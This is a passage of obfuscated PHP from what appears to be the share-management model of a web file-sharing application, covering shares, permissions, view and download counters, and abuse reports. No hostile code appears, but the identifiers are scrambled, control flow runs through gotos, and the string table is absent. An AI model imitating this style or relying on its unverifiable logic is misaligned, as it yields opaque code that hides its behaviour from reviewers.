$_SERVER[ú∫]; if (!$cπ„∑¯Õ„í || $cπ„∑¯Õ„í == $D¬ëçÃ™∂€[191]) { return; } if ($d¬≈…¿ç•ñ == $D¬ëçÃ™∂€[1059]) { if ($D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[473]] == $D¬ëçÃ™∂€[87]) { Model($D¬ëçÃ™∂€[533])->eventShare($cπ„∑¯Õ„í, $D¬ëçÃ™∂€[1832]); } if ($D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[475]] == $D¬ëçÃ™∂€[87]) { Model($D¬ëçÃ™∂€[533])->eventShare($cπ„∑¯Õ„í, $D¬ëçÃ™∂€[1833]); } return; } goto AàÊß‘˜Ñπ; DÙÕ∞Î§ä‚: Model($D¬ëçÃ™∂€[533])->eventShare($cπ„∑¯Õ„í, $dùËÕõŸ±ê); return; goto fíæ∏àª≤ã; D˜ﬁÔ‹ä£Ù: if ($aÙ¨ÉëÒÍ±[$D¬ëçÃ™∂€[473]] == $D¬ëçÃ™∂€[87] && $D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[473]] == $D¬ëçÃ™∂€[191]) { $dùËÕõŸ±ê = $D¬ëçÃ™∂€[1835]; } if ($aÙ¨ÉëÒÍ±[$D¬ëçÃ™∂€[475]] == $D¬ëçÃ™∂€[191] && $D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[475]] == $D¬ëçÃ™∂€[87]) { $dùËÕõŸ±ê = $D¬ëçÃ™∂€[1833]; } if ($aÙ¨ÉëÒÍ±[$D¬ëçÃ™∂€[475]] == $D¬ëçÃ™∂€[87] && $D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[475]] == $D¬ëçÃ™∂€[191]) { $dùËÕõŸ±ê = $D¬ëçÃ™∂€[1836]; } goto DÙÕ∞Î§ä‚; AàÊß‘˜Ñπ: $aÙ¨ÉëÒÍ± = $this->getInfoByPath($cπ„∑¯Õ„í); $dùËÕõŸ±ê = $D¬ëçÃ™∂€[1834]; if ($aÙ¨ÉëÒÍ±[$D¬ëçÃ™∂€[473]] == $D¬ëçÃ™∂€[191] && $D∏Ö ¯Ì˘ó[$D¬ëçÃ™∂€[473]] == $D¬ëçÃ™∂€[87]) { $dùËÕõŸ±ê = $D¬ëçÃ™∂€[1832]; } goto D˜ﬁÔ‹ä£Ù; fíæ∏àª≤ã: } private function _addShareData($b©ôñÈŒÉÆ, $C≤î ú£·Ù = array()) { goto Bƒ¡⁄ éæı; Bƒ¡⁄ éæı: $AµÃ´‚„¨Õ =& $_SERVER[ú∫]; $Dç◊ù£û€‚ = array($AµÃ´‚„¨Õ[410] => $b©ôñÈŒÉÆ, $AµÃ´‚„¨Õ[1520] => USER_ID); if ($b©ôñÈŒÉÆ == 0) { $Dç◊ù£û€‚ = array($AµÃ´‚„¨Õ[1837] => $C≤î ú£·Ù[$AµÃ´‚„¨Õ[1071]], $AµÃ´‚„¨Õ[1520] => USER_ID); } goto d÷Ç†éùëÒ; bºÔ∑øÑ‰—: $fÎœÚ„ﬂò = $this->add($BÚÂØ‰—à‘); $d›¿ôÑ◊√¯ = array($AµÃ´‚„¨Õ[470] => short_id($fÎœÚ„ﬂò)); $this->where(array($AµÃ´‚„¨Õ[467] => $fÎœÚ„ﬂò))->save($d›¿ôÑ◊√¯); goto f¨›ØÿÀ‚·; f¨›ØÿÀ‚·: return $fÎœÚ„ﬂò; goto eÉß°‰”Ë‹; d÷Ç†éùëÒ: if ($A‘ﬁè»‘“∫ = $this->where($Dç◊ù£û€‚)->find()) { return $A‘ﬁè»‘“∫[$AµÃ´‚„¨Õ[468]]; } if ($b©ôñÈŒÉÆ == 0) { $dåÕ„±≈æ® = array($AµÃ´‚„¨Õ[28] => get_path_this($C≤î ú£·Ù[$AµÃ´‚„¨Õ[76]])); } else { $dåÕ„±≈æ® = Model($AµÃ´‚„¨Õ[790])->sourceInfo($b©ôñÈŒÉÆ); if (!$dåÕ„±≈æ®) { return !1; } } if (!$C≤î ú£·Ù[$AµÃ´‚„¨Õ[1432]]) { $C≤î ú£·Ù[$AµÃ´‚„¨Õ[1432]] = $dåÕ„±≈æ®[$AµÃ´‚„¨Õ[28]]; } goto f‡ÃêÿËâÎ; f‡ÃêÿËâÎ: $BÚÂØ‰—à‘ = array($AµÃ´‚„¨Õ[1520] => USER_ID, $AµÃ´‚„¨Õ[410] => $b©ôñÈŒÉÆ, $AµÃ´‚„¨Õ[1432] => $AµÃ´‚„¨Õ[33], $AµÃ´‚„¨Õ[473] => 0, $AµÃ´‚„¨Õ[475] => 0, $AµÃ´‚„¨Õ[1071] => $AµÃ´‚„¨Õ[33], $AµÃ´‚„¨Õ[305] => $AµÃ´‚„¨Õ[33], $AµÃ´‚„¨Õ[849] => $AµÃ´‚„¨Õ[33], $AµÃ´‚„¨Õ[1838] => 0, $AµÃ´‚„¨Õ[1839] => 0, $AµÃ´‚„¨Õ[476] => 0, $AµÃ´‚„¨Õ[477] => $AµÃ´‚„¨Õ[33], $AµÃ´‚„¨Õ[470] => $AµÃ´‚„¨Õ[33]); $A›ÖŸı«≤œ = explode($AµÃ´‚„¨Õ[47], $AµÃ´‚„¨Õ[1840]); foreach ($A›ÖŸı«≤œ as $f¡¥ı«Ö”ï) { if (!isset($C≤î ú£·Ù[$f¡¥ı«Ö”ï])) { continue; } $BÚÂØ‰—à‘[$f¡¥ı«Ö”ï] = $C≤î ú£·Ù[$f¡¥ı«Ö”ï]; } goto bºÔ∑øÑ‰—; eÉß°‰”Ë‹: } private function _shareAuthSet($Féå≤ó•·£, $b»ıÕ∞ò’ú) { goto e°öØíÇ’©; CÉËÙéÁàâ: $dœ°∫§ªÚÁ->where(array($A∂±›ñƒ§[468] => $Féå≤ó•·£))->delete(); $AæßßÛÎ’ã = array(); foreach ($b»ıÕ∞ò’ú as $FÎ‹Âùèê„) { $E“ÀŒÉè…≈ = SourceModel::TYPE_USER; if ($FÎ‹Âùèê„[$A∂±›ñƒ§[404]] == SourceModel::TYPE_GROUP) { $E“ÀŒÉè…≈ = SourceModel::TYPE_GROUP; } $dêãÀ¨Ô≥– = array($A∂±›ñƒ§[468] => $Féå≤ó•·£, $A∂±›ñƒ§[404] => $E“ÀŒÉè…≈, $A∂±›ñƒ§[484] => intval($FÎ‹Âùèê„[$A∂±›ñƒ§[484]]), $A∂±›ñƒ§[1787] => 0, $A∂±›ñƒ§[1841] => -1); if ($FÎ‹Âùèê„[$A∂±›ñƒ§[1787]]) { $dêãÀ¨Ô≥–[$A∂±›ñƒ§[1787]] = $FÎ‹Âùèê„[$A∂±›ñƒ§[1787]]; } else { if ($FÎ‹Âùèê„[$A∂±›ñƒ§[1841]]) { $dêãÀ¨Ô≥–[$A∂±›ñƒ§[1841]] = $FÎ‹Âùèê„[$A∂±›ñƒ§[1841]]; } } $AæßßÛÎ’ã[] = $dêãÀ¨Ô≥–; } goto e‹ÂŸ¬ûË∏; e‹ÂŸ¬ûË∏: return $dœ°∫§ªÚÁ->addAll($AæßßÛÎ’ã, array(), !0); goto E«úó•éëÕ; e°öØíÇ’©: $A∂±›ñƒ§ =& $_SERVER[ú∫]; if (!is_array($b»ıÕ∞ò’ú)) { return !1; } $dœ°∫§ªÚÁ = Model($A∂±›ñƒ§[1791]); goto CÉËÙéÁàâ; E«úó•éëÕ: } public function numViewAdd($AÇë«Ç¡ªŒ) { $aÙÈ◊öÍ∏é =& $_SERVER[ú∫]; $aŸﬂﬂª∂Ç´ = array($aÙÈ◊öÍ∏é[467] => $AÇë«Ç¡ªŒ); $this->where($aŸﬂﬂª∂Ç´)->setAdd($aÙÈ◊öÍ∏é[1838]); } public function numDownloadAdd($A∫¨ê–◊◊Ú) { $bãøêßå¡É =& $_SERVER[ú∫]; $b˜≈∏ﬁêÆ  = array($bãøêßå¡É[467] => $A∫¨ê–◊◊Ú); $this->where($b˜≈∏ﬁêÆ )->setAdd($bãøêßå¡É[1839]); } protected function shareEdit($BëÖŒÍ˜Ï∑, $d≠±¥≠≤ä—) { goto aÉﬂÔ‡÷ÎÕ; aÉﬂÔ‡÷ÎÕ: $DË‡ÉˆüëÏ =& $_SERVER[ú∫]; $b•Üå‡©àÑ = $this->getInfo($BëÖŒÍ˜Ï∑); if (!$b•Üå‡©àÑ) { return !1; } goto cÇ—£∫ä»º; BùÁÕ∑±—Ó: foreach ($CÉ®´¨á’‰ as $d∞«‹°„Ø∑) { if (!array_key_exists($d∞«‹°„Ø∑, $d≠±¥≠≤ä—)) { continue; } $a—ÓµÓ·É‚[$d∞«‹°„Ø∑] = $d≠±¥≠≤ä—[$d∞«‹°„Ø∑]; } $this->shareEventAdd($b•Üå‡©àÑ[$DË‡ÉˆüëÏ[395]], $d≠±¥≠≤ä—, $DË‡ÉˆüëÏ[1659]); $this->where(array($DË‡ÉˆüëÏ[467] => $BëÖŒÍ˜Ï∑))->save($a—ÓµÓ·É‚); goto dπ∂º∑ˆ¢«; cÇ—£∫ä»º: $this->_checkLinkShare($d≠±¥≠≤ä—, $b•Üå‡©àÑ); $a—ÓµÓ·É‚ = array(); $CÉ®´¨á’‰ = explode($DË‡ÉˆüëÏ[47], $DË‡ÉˆüëÏ[1842]); goto BùÁÕ∑±—Ó; dπ∂º∑ˆ¢«: if (isset($d≠±¥≠≤ä—[$DË‡ÉˆüëÏ[1831]])) { $this->_shareAuthSet($BëÖŒÍ˜Ï∑, $d≠±¥≠≤ä—[$DË‡ÉˆüëÏ[1831]]); } return !0; goto EÆ„áÖÕ≠÷; EÆ„áÖÕ≠÷: } private function _checkLinkShare($côÒ©≈ù·È, $bè©¬˜∏˘≥) { goto FÛ øº√º⁄; FÛ øº√º⁄: $Fçë¬°°∏» =& $_SERVER[ú∫]; if ($côÒ©≈ù·È[$Fçë¬°°∏»[473]] != $Fçë¬°°∏»[87]) { return; } $Fú±ÜôòÔ¿ = $bè©¬˜∏˘≥[$Fçë¬°°∏»[85]][$Fçë¬°°∏»[395]]; goto B·‹ÈÇì“¬; B·‹ÈÇì“¬: if ($bè©¬˜∏˘≥[$Fçë¬°°∏»[85]][$Fçë¬°°∏»[29]] != $Fçë¬°°∏»[193]) { $Cí¿á¯∑Ñ÷ = $this->_folderReport($Fú±ÜôòÔ¿); if (!$Cí¿á¯∑Ñ÷) { return; } show_json(LNG($Fçë¬°°∏»[1843]) . $Fçë¬°°∏»[1844] . $Cí¿á¯∑Ñ÷, !1); } $FëÃ©¢ÑÏ„ = Model($Fçë¬°°∏»[790])->fileInfoGet($bè©¬˜∏˘≥[$Fçë¬°°∏»[85]][$Fçë¬°°∏»[395]]); if (!$FëÃ©¢ÑÏ„) { return; } goto e•ß“¿âﬂ; e•ß“¿âﬂ: $eáˆÙÊ«âÀ = $this->shareFileMeta($FëÃ©¢ÑÏ„[$Fçë¬°°∏»[447]]); if (isset($eáˆÙÊ«âÀ[$Fçë¬°°∏»[372]]) && $eáˆÙÊ«âÀ[$Fçë¬°°∏»[372]] == $Fçë¬°°∏»[87]) { show_json(LNG($Fçë¬°°∏»[1845]), !1); } goto CëÃ≠∏›Ùã; CëÃ≠∏›Ùã: } private function _folderReport($bæ§®ß¯—ê) { goto cë∞ãµ“Éˆ; DÉÕ ¿çπ∫: $Búû’òøÜ´ = substr($fÈ≥Ë¯Ã£Ô[$d‰âë‡Ñ≠∞[487]], strpos($fÈ≥Ë¯Ã£Ô[$d‰âë‡Ñ≠∞[487]], $fáßÃ ƒ€—)); $C∞‹ú◊ºêÌ = array($d‰âë‡Ñ≠∞[395] => array($d‰âë‡Ñ≠∞[7], trim($Búû’òøÜ´, $d‰âë‡Ñ≠∞[47]))); $E°Ô†÷ë–⁄ = Model($d‰âë‡Ñ≠∞[790])->where($C∞‹ú◊ºêÌ)->field($d‰âë‡Ñ≠∞[28])->select(); goto c≥∑Üﬂ¢œ; a˘ï‰õ¶«Ç: $C∞‹ú◊ºêÌ = array($d‰âë‡Ñ≠∞[447] => array($d‰âë‡Ñ≠∞[7], $eΩ”¿Œí≈ï), $d‰âë‡Ñ≠∞[487] => array($d‰âë‡Ñ≠∞[380], "\45{$fáßÃ ƒ€—}\x25"), $d‰âë‡Ñ≠∞[423] => 0); $fÈ≥Ë¯Ã£Ô = Model($d‰âë‡Ñ≠∞[790])->where($C∞‹ú◊ºêÌ)->field($d‰âë‡Ñ≠∞[1847])->find(); if (!$fÈ≥Ë¯Ã£Ô) { return !1; } goto DÉÕ ¿çπ∫; cë∞ãµ“Éˆ: $d‰âë‡Ñ≠∞ =& $_SERVER[ú∫]; $C∞‹ú◊ºêÌ = array($d‰âë‡Ñ≠∞[447] => array($d‰âë‡Ñ≠∞[969], 0), $d‰âë‡Ñ≠∞[710] => 3); $eΩ”¿Œí≈ï = Model($d‰âë‡Ñ≠∞[1846])->where($C∞‹ú◊ºêÌ)->field($d‰âë‡Ñ≠∞[447])->select(); goto B›¿ﬂÿö´ù; B›¿ﬂÿö´ù: if (!$eΩ”¿Œí≈ï) { return !1; } $eΩ”¿Œí≈ï = array_to_keyvalue($eΩ”¿Œí≈ï, $d‰âë‡Ñ≠∞[33], $d‰âë‡Ñ≠∞[447]); $fáßÃ ƒ€— = $d‰âë‡Ñ≠∞[47] . $bæ§®ß¯—ê . $d‰âë‡Ñ≠∞[47]; goto a˘ï‰õ¶«Ç; c≥∑Üﬂ¢œ: $E√∂°•Œ¡« = array_to_keyvalue($E°Ô†÷ë–⁄, $d‰âë‡Ñ≠∞[33], $d‰âë‡Ñ≠∞[28]); $E√∂°•Œ¡«[] = $fÈ≥Ë¯Ã£Ô[$d‰âë‡Ñ≠∞[28]]; return implode($d‰âë‡Ñ≠∞[8], $E√∂°•Œ¡«); goto DΩ››Êú‚∏; DΩ››Êú‚∏: } protected function remove($cá‚‹ö‚ß·) { goto d≥¯˜∑¡¬¨; d≥¯˜∑¡¬¨: $d Ø¶ÒË…è =& $_SERVER[ú∫]; if (is_array($cá‚‹ö‚ß·)) { $cá‚‹ö‚ß· = array($d Ø¶ÒË…è[7], $cá‚‹ö‚ß·); } $CÙÍ˜õ‘¶∞ = array($d Ø¶ÒË…è[468] => $cá‚‹ö‚ß·); goto d¥˜«çÂ¿¡; d¥˜«çÂ¿¡: $cÒä…ê¯âá = $this->where($CÙÍ˜õ‘¶∞)->delete(); if ($cÒä…ê¯âá) { Model($d Ø¶ÒË…è[564])->where(array($d Ø¶ÒË…è[468] => $cá‚‹ö‚ß·))->delete(); } $b˘òàïΩ◊ﬂ = is_array($cá‚‹ö‚ß·) ? $cá‚‹ö‚ß·[1] : array($cá‚‹ö‚ß·); goto f »£éÁ´; f »£éÁ´: for ($f¨–ÿñÇƒı = 0; $f¨–ÿñÇƒı < count($b˘òàïΩ◊ﬂ); $f¨–ÿñÇƒı++) { $EŒû¡Éè¥„ = $this->getInfo($b˘òàïΩ◊ﬂ[$f¨–ÿñÇƒı]); if ($EŒû¡Éè¥„[$d Ø¶ÒË…è[475]] == $d Ø¶ÒË…è[87]) { Model($d Ø¶ÒË…è[533])->eventShare($EŒû¡Éè¥„[$d Ø¶ÒË…è[395]], $d Ø¶ÒË…è[1836]); } if ($EŒû¡Éè¥„[$d Ø¶ÒË…è[473]] == $d Ø¶ÒË…è[87]) { Model($d Ø¶ÒË…è[533])->eventShare($EŒû¡Éè¥„[$d Ø¶ÒË…è[395]], $d Ø¶ÒË…è[1835]); } } return $cÒä…ê¯âá; goto D‹»ßÑäô†; D‹»ßÑäô†: } protected function removeBySource($f¡©¯Ã∂ö¯) { goto B·≠üàäó÷; B·≠üàäó÷: $a±ÿéúÍÑï =& $_SERVER[ú∫]; $c¨éùµñ™Ô = array($a±ÿéúÍÑï[410] => array($a±ÿéúÍÑï[411], $f¡©¯Ã∂ö¯)); $FÁÆ’´¯èî = $this->field($a±ÿéúÍÑï[468])->where($c¨éùµñ™Ô)->select(); goto cî¡·¢ë”≈; cî¡·¢ë”≈: $FÁÆ’´¯èî = array_to_keyvalue($FÁÆ’´¯èî, $a±ÿéúÍÑï[33], $a±ÿéúÍÑï[468]); if (!$FÁÆ’´¯èî) { return; } $c¨éùµñ™Ô = array($a±ÿéúÍÑï[467] => array($a±ÿéúÍÑï[411], $FÁÆ’´¯èî)); goto D÷õÚäÚÃÿ; D÷õÚäÚÃÿ: $this->where($c¨éùµñ™Ô)->delete(); Model($a±ÿéúÍÑï[564])->where($c¨éùµñ™Ô)->delete(); goto AÍâΩÏµﬁÉ; AÍâΩÏµﬁÉ: } public function listAll($f·ú¨Ç∫êû) { goto d˘ÜΩ«≥Ô; eŸÏˆâ‚‹œ: $Eã“éÀéåÂ = $this->_makeOrder()->where($DÇï…ø≠Æ–)->selectPage(20); if (empty($Eã“éÀéåÂ[$DÇª—∏Úïπ[367]])) { return array(); } $this->_listDataApply($Eã“éÀéåÂ[$DÇª—∏Úïπ[367]]); goto e•ΩöÍª–∏; E√êÕ‡£‡ï: if ($f·ú¨Ç∫êû[$DÇª—∏Úïπ[721]]) { $fÜ∏ÑπÑüÁ = $f·ú¨Ç∫êû[$DÇª—∏Úïπ[476]] ? $f·ú¨Ç∫êû[$DÇª—∏Úïπ[476]] : strtotime(date($DÇª—∏Úïπ[1848])); $DÇï…ø≠Æ–[$DÇª—∏Úïπ[194]] = array($DÇª—∏Úïπ[331], array($f·ú¨Ç∫êû[$DÇª—∏Úïπ[721]], $fÜ∏ÑπÑüÁ)); } if ($f·ú¨Ç∫êû[$DÇª—∏Úïπ[29]]) { $DÇï…ø≠Æ–[$f·ú¨Ç∫êû[$DÇª—∏Úïπ[29]]] = 1; } else { $DÇï…ø≠Æ–[] = array($DÇª—∏Úïπ[473] => array($DÇª—∏Úïπ[969], 0), $DÇª—∏Úïπ[475] => array($DÇª—∏Úïπ[969], 0), $DÇª—∏Úïπ[1825] => $DÇª—∏Úïπ[1779]); } if ($f·ú¨Ç∫êû[$DÇª—∏Úïπ[1775]]) { $DÇï…ø≠Æ–[] = array($DÇª—∏Úïπ[470] => $f·ú¨Ç∫êû[$DÇª—∏Úïπ[1775]], $DÇª—∏Úïπ[1432] => array($DÇª—∏Úïπ[380], "\45{$f·ú¨Ç∫êû[$DÇª—∏Úïπ[1775]]}\45"), $DÇª—∏Úïπ[1825] => $DÇª—∏Úïπ[1779]); } goto eŸÏˆâ‚‹œ; e•ΩöÍª–∏: return $Eã“éÀéåÂ; goto F„‡Ïû‚ë; d˘ÜΩ«≥Ô: $DÇª—∏Úïπ =& $_SERVER[ú∫]; $DÇï…ø≠Æ– = array(); if ($f·ú¨Ç∫êû[$DÇª—∏Úïπ[1528]]) { $DÇï…ø≠Æ–[$DÇª—∏Úïπ[1528]] = $f·ú¨Ç∫êû[$DÇª—∏Úïπ[1528]]; } goto E√êÕ‡£‡ï; F„‡Ïû‚ë: } public function listDataApply($B‡ßÖåÉÜ‘) { $this->_listDataApply($B‡ßÖåÉÜ‘); return $B‡ßÖåÉÜ‘; } private function _listDataApply(&$dÌÒ¬‰éÔß) { goto DúÖ∏◊¨Õô; e∏É·ºÔ¢ñ: unset($AÍ¿⁄∞Ω¬¯); $dÌÒ¬‰éÔß = array_values($dÌÒ¬‰éÔß); goto C£üêõÉ‘ï; e›∂ÑöœËù: $D◊◊Éè•ìå = array_to_keyvalue($dÌÒ¬‰éÔß, $AëºèÜ«ÿÔ[33], $AëºèÜ«ÿÔ[395]); $aòÏÀÈêÑÖ = Model($AëºèÜ«ÿÔ[790])->sourceListInfo($D◊◊Éè•ìå, !0); foreach ($dÌÒ¬‰éÔß as $cùéÉ«ïâŒ => &$AÍ¿⁄∞Ω¬¯) { $C•±ÙÇó¢¨ = $AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[1528]]; $AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[1849]] = $dËãƒπ¥ìê[$C•±ÙÇó¢¨] ? $dËãƒπ¥ìê[$C•±ÙÇó¢¨] : !1; $C‰∆ê¬Ïã = $AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[395]]; $AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[85]] = $aòÏÀÈêÑÖ[$C‰∆ê¬Ïã] ? $aòÏÀÈêÑÖ[$C‰∆ê¬Ïã] : !1; if ($AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[85]][$AëºèÜ«ÿÔ[423]] == $AëºèÜ«ÿÔ[87]) { unset($dÌÒ¬‰éÔß[$cùéÉ«ïâŒ]); } if ($AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[85]] != $AëºèÜ«ÿÔ[191] && !$AÍ¿⁄∞Ω¬¯[$AëºèÜ«ÿÔ[85]]) { unset($dÌÒ¬‰éÔß[$cùéÉ«ïâŒ]); } } goto e∏É·ºÔ¢ñ; DúÖ∏◊¨Õô: $AëºèÜ«ÿÔ =& $_SERVER[ú∫]; $AŒ¯÷±Â¿ã = array_to_keyvalue($dÌÒ¬‰éÔß, $AëºèÜ«ÿÔ[33], $AëºèÜ«ÿÔ[1528]); $dËãƒπ¥ìê = Model($AëºèÜ«ÿÔ[506])->userListInfo(array_unique($AŒ¯÷±Â¿ã)); goto e›∂ÑöœËù; C£üêõÉ‘ï: } private function _makeOrder($d∂¨¢ûã∞Ë = '') { goto e≤ÇÁ™¿Ïú; e≤ÇÁ™¿Ïú: $F“¨Ôãúè‡ =& $_SERVER[ú∫]; $bëπ©≠áÖﬂ = array($F“¨Ôãúè‡[194], $F“¨Ôãúè‡[476], $F“¨Ôãúè‡[1838], $F“¨Ôãúè‡[1839]); $aÿ÷˜“√π  = array($F“¨Ôãúè‡[428] => $F“¨Ôãúè‡[429], $F“¨Ôãúè‡[430] => $F“¨Ôãúè‡[431]); goto Eª–ˆ©í‰¬; Eª–ˆ©í‰¬: $dò“ı·¬Ñá = Input::get($F“¨Ôãúè‡[435], $F“¨Ôãúè‡[7], $F“¨Ôãúè‡[416], $bëπ©≠áÖﬂ); $FïﬁÕéìËâ = Input::get($F“¨Ôãúè‡[436], $F“¨Ôãúè‡[7], $F“¨Ôãúè‡[1850], array($F“¨Ôãúè‡[1774], $F“¨Ôãúè‡[430])); $FïﬁÕéìËâ = $aÿ÷˜“√π [$FïﬁÕéìËâ]; goto eïƒ˜ÊÚÀ; eïƒ˜ÊÚÀ: $d∂¨¢ûã∞Ë = $d∂¨¢ûã∞Ë . "{$dò“ı·¬Ñá}\40{$FïﬁÕéìËâ}"; return $this->order($d∂¨¢ûã∞Ë); goto eòÃÙÓ≠·™; eòÃÙÓ≠·™: } public function reportAdd($b¡≤ÖØÇÉÆ) { $aˆ§Œ‚∑Ã¯ =& $_SERVER[ú∫]; $e¬Àƒ„Ω±ë = array($aˆ§Œ‚∑Ã¯[468] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[468]], $aˆ§Œ‚∑Ã¯[1528] => USER_ID); if (Model($aˆ§Œ‚∑Ã¯[1846])->where($e¬Àƒ„Ω±ë)->find()) { return !1; } $d‘®¢é≥ñõ = array($aˆ§Œ‚∑Ã¯[468] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[468]], $aˆ§Œ‚∑Ã¯[1432] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[1432]], $aˆ§Œ‚∑Ã¯[395] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[395]], $aˆ§Œ‚∑Ã¯[447] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[447]], $aˆ§Œ‚∑Ã¯[1528] => USER_ID, $aˆ§Œ‚∑Ã¯[29] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[29]], $aˆ§Œ‚∑Ã¯[431] => $b¡≤ÖØÇÉÆ[$aˆ§Œ‚∑Ã¯[431]]); return Model($aˆ§Œ‚∑Ã¯[1846])->add($d‘®¢é≥ñõ); } public function reportList($fƒ•ÈûÑÖ) { goto cÙã∂≠ƒÈ§; cÙã∂≠ƒÈ§: $d”ÒÏÿÀº– =& $_SERVER[ú∫]; $bﬂìŒÈ“Ôö = array(); if ($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[721]]) { $fåó’êâ€à = $fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[476]] ? $fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[476]] : strtotime(date($d”ÒÏÿÀº–[1848])); $bﬂìŒÈ“Ôö[$d”ÒÏÿÀº–[194]] = array($d”ÒÏÿÀº–[331], array($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[721]], $fåó’êâ€à)); } goto F•û†’çòó; FÂë‹ÜÏ©¿: if (empty($a∞…Üà•£Ü[$d”ÒÏÿÀº–[367]])) { return array(); } $bóÍ“Öèº∆ = array_to_keyvalue_group($a∞…Üà•£Ü[$d”ÒÏÿÀº–[367]], $d”ÒÏÿÀº–[710], $d”ÒÏÿÀº–[468]); if (!empty($bóÍ“Öèº∆[0])) { $fƒ•ÈûÑÖ = $bóÍ“Öèº∆[0]; $bﬂìŒÈ“Ôö = array($d”ÒÏÿÀº–[468] => array($d”ÒÏÿÀº–[7], $fƒ•ÈûÑÖ)); $Fã˘È‰∑ùÉ = $this->where($bﬂìŒÈ“Ôö)->field($d”ÒÏÿÀº–[468])->select(); $Fã˘È‰∑ùÉ = array_to_keyvalue($Fã˘È‰∑ùÉ, $d”ÒÏÿÀº–[33], $d”ÒÏÿÀº–[468]); $B∑∂çÿ…›ã = array_diff($fƒ•ÈûÑÖ, $Fã˘È‰∑ùÉ); if (!empty($B∑∂çÿ…›ã)) { foreach ($a∞…Üà•£Ü[$d”ÒÏÿÀº–[367]] as $fƒÎªôÆúı => $fÊÿÌü«ﬁ„) { if (in_array($fÊÿÌü«ﬁ„[$d”ÒÏÿÀº–[468]], $B∑∂çÿ…›ã)) { unset($a∞…Üà•£Ü[$d”ÒÏÿÀº–[367]][$fƒÎªôÆúı]); } } } } goto B≠Ü◊Ôèç∏; F•û†’çòó: if (isset($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[29]]) && in_array($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[29]], array($d”ÒÏÿÀº–[87], $d”ÒÏÿÀº–[1851], $d”ÒÏÿÀº–[1852], $d”ÒÏÿÀº–[1853], $d”ÒÏÿÀº–[1854]))) { $bﬂìŒÈ“Ôö[$d”ÒÏÿÀº–[29]] = $fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[29]]; } if (isset($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[710]]) && in_array($fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[710]], array($d”ÒÏÿÀº–[191], $d”ÒÏÿÀº–[87], $d”ÒÏÿÀº–[1851], $d”ÒÏÿÀº–[1852]))) { $bﬂìŒÈ“Ôö[$d”ÒÏÿÀº–[710]] = $fƒ•ÈûÑÖ[$d”ÒÏÿÀº–[710]]; } $dÚúã˘ÍÜÈ = Input::get($d”ÒÏÿÀº–[436], $d”ÒÏÿÀº–[7], $d”ÒÏÿÀº–[1850], array($d”ÒÏÿÀº–[1774], $d”ÒÏÿÀº–[430])); goto Fíô∆¯·Ÿ≥; Fíô∆¯·Ÿ≥: $Fﬂù≠Üﬂ®ú = array($d”ÒÏÿÀº–[428] => $d”ÒÏÿÀº–[429], $d”ÒÏÿÀº–[430] => $d”ÒÏÿÀº–[431]); $f‰·¶ŒÃòú = $d”ÒÏÿÀº–[1855] . $Fﬂù≠Üﬂ®ú[$dÚúã˘ÍÜÈ]; $a∞…Üà•£Ü = Model($d”ÒÏÿÀº–[1846])->where($bﬂìŒÈ“Ôö)->order($f‰·¶ŒÃòú)->selectPage(20); goto FÂë‹ÜÏ©¿; B≠Ü◊Ôèç∏: $this->_listDataApply($a∞…Üà•£Ü[$d”ÒÏÿÀº–[367]]); return $a∞…Üà•£Ü; goto aè“ΩøÙ°©; aè“ΩøÙ°©: } public function reportStatus($Fëí¢–¡ËÍ) { goto a‘âÀ¯“”; Bè†í“Ç…Ø: return $e¶î◊ËÊﬁ¿; goto f«öÑÉÍÖ€; a‘âÀ¯“”: $b¬‚«ùøÊä =& $_SERVER[ú∫]; $Bäùƒ·•º° = array($b¬‚«ùøÊä[393] => $Fëí¢–¡ËÍ[$b¬‚«ùøÊä[393]]); $Eç¥ç∂ıÏÇ = Model($b¬‚«ùøÊä[1846])->where($Bäùƒ·•º°)->field($b¬‚«ùøÊä[1856])->find(); goto Eéàø≤¶’ ; Eéàø≤¶’ : if (!$Eç¥ç∂ıÏÇ) { return !1; } $cÓÿÌãÀÙÜ = array($b¬‚«ùøÊä[710] => $Fëí¢–¡ËÍ[$b¬‚«ùøÊä[710]]); if ($Fëí¢–¡ËÍ[$b¬‚«ùøÊä[710]] == $b¬‚«ùøÊä[1852] && $Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[710]] == $b¬‚«ùøÊä[1852]) { $cÓÿÌãÀÙÜ[$b¬‚«ùøÊä[710]] = 0; } goto cáÆßå¶˘ô; cáÆßå¶˘ô: $e¶î◊ËÊﬁ¿ = Model($b¬‚«ùøÊä[1846])->where($Bäùƒ·•º°)->save($cÓÿÌãÀÙÜ); if ($Fëí¢–¡ËÍ[$b¬‚«ùøÊä[710]] == $b¬‚«ùøÊä[1851]) { if ($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[447]] != $b¬‚«ùøÊä[191] && $this->shareFileMeta($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[447]])) { $this->shareFileMeta($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[447]], 0); } $this->remove($Eç¥ç∂ıÏÇ[$b¬‚«ùøÊä[468]]); return !0; } if ($e¶î◊ËÊﬁ¿ && 